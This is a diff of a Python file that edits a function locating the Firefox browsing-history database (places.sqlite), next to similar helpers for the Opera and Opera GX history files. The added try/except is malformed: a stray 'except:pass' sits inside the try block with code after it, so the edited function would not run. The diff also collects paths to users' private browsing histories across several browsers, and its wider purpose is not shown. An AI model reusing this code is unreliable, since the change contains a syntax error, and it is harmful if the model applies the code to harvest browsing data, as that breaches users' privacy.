@@ -881,21 +881,24 @@ def find_operagx_history_file():
     return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
 
 def find_firefox_history_file():
-    if os.name == "nt":
-        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
-    elif os.name == "posix":
-        profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
-    else:
-        return None
+    try:
+        if os.name == "nt":
+            profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+        elif os.name == "posix":
+            profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
+        else:
+            return None
+        except:pass
 
-    profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
-    if not profiles:
-        return None
+        profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
+        if not profiles:
+            return None
 
-    profile_path = os.path.join(profile_path, profiles[0])
-    history_file_path = os.path.join(profile_path, "places.sqlite")
+        profile_path = os.path.join(profile_path, profiles[0])
+        history_file_path = os.path.join(profile_path, "places.sqlite")
 
-    return history_file_path if os.path.exists(history_file_path) else None
+        return history_file_path if os.path.exists(history_file_path) else None
+    except:return None
 
 def find_opera_history_file():
     return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
